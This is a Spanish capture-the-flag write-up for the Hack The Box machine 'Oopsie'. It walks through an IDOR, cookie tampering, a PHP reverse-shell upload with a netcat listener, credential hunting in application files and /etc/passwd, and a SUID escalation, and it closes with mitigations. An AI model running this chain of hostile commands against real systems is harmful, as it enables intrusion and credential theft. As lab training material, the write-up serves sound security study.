# Oopsie — HTB

**Plataforma:** Hack The Box
**Dificultad:** Fácil
**Categoría:** Linux / Web / IDOR / File Upload / SUID

---

## 1. 🔎 Reconocimiento

### Nmap

```bash
nmap -sCV -p- -Pn 10.129.163.38
```

Escaneamos todos los puertos para identificar los servicios expuestos.

Encontramos:

* `22/tcp` → SSH
* `80/tcp` → HTTP — Apache

Accedemos a la aplicación web:

```text
http://10.129.163.38
```

---

## 2. 📋 Enumeración

### Enumeración de directorios

Utilizamos `ffuf` para descubrir archivos y directorios:

```bash
ffuf -u http://10.129.163.38/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Inicialmente encontramos:

```text
/index.php
```

En la página encontramos información relacionada con el dominio:

```text
@megacorp.com
```

Probamos una wordlist diferente, pero no encontramos nuevos recursos relevantes.

### Código fuente y JavaScript

Al no encontrar más información mediante fuzzing, inspeccionamos el código fuente de la página y los scripts JavaScript.

Encontramos una referencia interesante:

```text
/cdn-cgi/login/script.js
```

Accedemos al directorio:

```text
http://10.129.163.38/cdn-cgi/login/
```

Encontramos un panel de login.

La aplicación permite acceder como usuario invitado:

```text
Usuario: guest
Email: guest@megacorp.com
```

---

### Enumeración del panel

Una vez dentro del panel observamos una URL interesante:

```text
/cdn-cgi/login/admin.php?content=accounts&id=2
```

El parámetro:

```text
id=2
```

parece identificar una cuenta.

Probamos modificándolo:

```text
/cdn-cgi/login/admin.php?content=accounts&id=1
```

Al modificar el `id` conseguimos acceder a información de otras cuentas.

Entre ellas encontramos:

```text
admin@megacorp.com
Access ID: 34322
```

Esto indica que el servidor no está comprobando correctamente si el usuario autenticado tiene permiso para acceder al recurso solicitado.

Estamos ante un **IDOR (Insecure Direct Object Reference)**.

---

### Cookie y cambio de usuario

La aplicación utiliza una cookie para identificar al usuario.

Tenemos acceso como:

```text
guest
```

y hemos descubierto el `Access ID` asociado al administrador:

```text
34322
```

Modificamos la cookie para utilizar la información correspondiente al administrador.

Al recargar la página conseguimos acceder al panel administrativo.

---

### Subida de archivos

Desde el panel administrativo encontramos una funcionalidad que permite subir archivos.

Utilizamos una reverse shell PHP disponible en Kali:

```text
/usr/share/webshells/php/php-reverse-shell.php
```

Antes de utilizarla debemos configurar nuestra IP y puerto de escucha dentro del archivo.

Después necesitamos averiguar dónde está almacenado el archivo subido.

Utilizamos `ffuf`:

```bash
ffuf -u http://10.129.163.38/FUZZ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-e .php
```

Encontramos:

```text
/uploads
```

Por tanto, la reverse shell subida se encuentra en:

```text
http://10.129.163.38/uploads/php-reverse-shell.php
```

---

## 3. 💥 Explotación

### Reverse Shell

Nos ponemos a la escucha en nuestra máquina:

```bash
nc -lvnp 1234
```

A continuación accedemos desde el navegador al archivo PHP que hemos subido:

```text
http://10.129.163.38/uploads/php-reverse-shell.php
```

El servidor ejecuta el código PHP y establece una conexión hacia nuestra máquina.

Obtenemos una shell como:

```text
www-data
```

---

### Mejorar la shell

La shell obtenida inicialmente es bastante limitada.

Utilizamos Python para obtener una pseudo-terminal:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Ahora tenemos una terminal mucho más funcional.

---

### Obtener la primera flag

Nos desplazamos al directorio personal del usuario correspondiente y buscamos la flag:

```bash
cd /home
```

Enumeramos los directorios disponibles:

```bash
ls
```

Una vez localizado el directorio del usuario:

```bash
cd <usuario>
```

Buscamos la flag:

```bash
cat user.txt
```

---

### Búsqueda de credenciales

Como `www-data`, investigamos los archivos de la aplicación.

Nos dirigimos al directorio:

```bash
cd /var/www/html/cdn-cgi/login
```

Podemos buscar referencias a contraseñas:

```bash
cat * | grep -i passw*
```

Encontramos:

```text
MEGACORP_4dm1n!!
```

Esta credencial parece pertenecer a algún usuario de la aplicación o del sistema, así que continuamos enumerando usuarios:

```bash
cat /etc/passwd
```

---

### Credenciales en `db.php`

Encontramos un archivo interesante:

```bash
cat db.php
```

Contenido:

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Aquí encontramos unas credenciales:

```text
Usuario: robert
Contraseña: M3g4C0rpUs3r!
Base de datos: garage
```

Probamos las credenciales para cambiar al usuario `robert`:

```bash
su robert
```

Introducimos:

```text
M3g4C0rpUs3r!
```

Comprobamos nuestro usuario:

```bash
id
```

Obtenemos:

```text
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Lo importante aquí es que `robert` pertenece al grupo:

```text
bugtracker
```

Esto será relevante para la escalada de privilegios.

---

## 4. ⬆️ Escalada de privilegios

### Buscar archivos pertenecientes al grupo `bugtracker`

Como `robert` pertenece al grupo `bugtracker`, buscamos archivos cuyo grupo propietario sea `bugtracker`:

```bash
find / -group bugtracker 2>/dev/null
```

Encontramos un archivo relacionado con el servicio `bugtracker`.

Al revisar sus permisos observamos que tiene el bit **SUID** activado.

El bit SUID es especialmente interesante porque permite que un ejecutable se ejecute con los permisos de su propietario, independientemente del usuario que lo ejecute.

Por ejemplo:

```text
-rwsr-xr-x
   ↑
  SUID
```

La `s` en lugar de la `x` indica que el bit SUID está activo.

- Con el usuario robert ejecutamos el binario por que tiene permisos SUID en el grupo que está configuramos lo que nos pide y listo root y la flag.

---

## 5. 📄 Reporte

### Resumen

La máquina **Oopsie** expone un servidor web Apache con un panel de administración vulnerable.

Durante la enumeración descubrimos el panel `/cdn-cgi/login/` y conseguimos acceder como usuario invitado.

La aplicación presenta un **IDOR**, permitiendo modificar el identificador de cuenta y acceder a información de otros usuarios. Mediante esta vulnerabilidad conseguimos acceder a la cuenta administrativa.

El panel administrativo permite subir archivos, lo que nos permite cargar una reverse shell PHP.

Tras obtener acceso como `www-data`, encontramos credenciales en los archivos de la aplicación. Las credenciales de `db.php` nos permiten cambiar al usuario `robert`.

El usuario `robert` pertenece al grupo `bugtracker`, lo que nos lleva a buscar archivos pertenecientes a dicho grupo y encontrar un binario con SUID, proporcionando el vector para la escalada final.

### Cadena de ataque

```text
Enumeración web
      ↓
/cdn-cgi/login/
      ↓
Acceso como guest
      ↓
IDOR mediante parámetro id
      ↓
Acceso como admin
      ↓
Subida de PHP reverse shell
      ↓
www-data
      ↓
Credenciales en db.php
      ↓
Usuario robert
      ↓
Grupo bugtracker
      ↓
Binario SUID
      ↓
Escalada a root
```

### Vulnerabilidades encontradas

| Vulnerabilidad                       | Severidad | Impacto                                |
| ------------------------------------ | --------- | -------------------------------------- |
| IDOR                                 | Alta      | Acceso no autorizado a cuentas         |
| File Upload inseguro                 | Crítica   | Permite subir y ejecutar código PHP    |
| Credenciales almacenadas en archivos | Alta      | Permite comprometer otros usuarios     |
| Binario SUID vulnerable              | Crítica   | Posible escalada de privilegios a root |

### Mitigaciones

* Implementar controles de autorización en cada recurso.
* No confiar únicamente en identificadores enviados por el cliente.
* Validar estrictamente los archivos subidos.
* Impedir la ejecución de código en directorios de uploads.
* No almacenar credenciales directamente en archivos de código.
* Utilizar variables de entorno o un sistema seguro de gestión de secretos.
* Revisar periódicamente los binarios con SUID.
* Eliminar permisos SUID innecesarios.
* Aplicar el principio de mínimo privilegio.

---

## 🧠 Lessons Learned

* `ffuf` sirve para descubrir directorios, archivos y otros recursos ocultos.
* Si el fuzzing no encuentra nada, hay que continuar con la revisión manual del código fuente y JavaScript.
* Un parámetro como `id=2` puede ser un indicador de un posible **IDOR**.
* Un IDOR ocurre cuando podemos acceder a recursos de otro usuario simplemente modificando un identificador sin que el servidor compruebe correctamente los permisos.
* Una subida de archivos PHP puede convertirse en RCE si el servidor permite ejecutar el archivo subido.
* `python3 -c 'import pty;pty.spawn("/bin/bash")'` permite mejorar una shell básica obtenida mediante una reverse shell.
* Los archivos de configuración de aplicaciones pueden contener credenciales reutilizables.
* `cat /etc/passwd` permite enumerar los usuarios existentes en Linux.
* `id` permite comprobar el usuario actual y los grupos a los que pertenece.
* Los grupos pueden ser importantes para encontrar vectores de escalada de privilegios.
* `find / -group <grupo> 2>/dev/null` permite localizar archivos pertenecientes a un grupo concreto.
* El bit **SUID** permite que un ejecutable se ejecute con los privilegios de su propietario y puede ser un vector de escalada de privilegios.
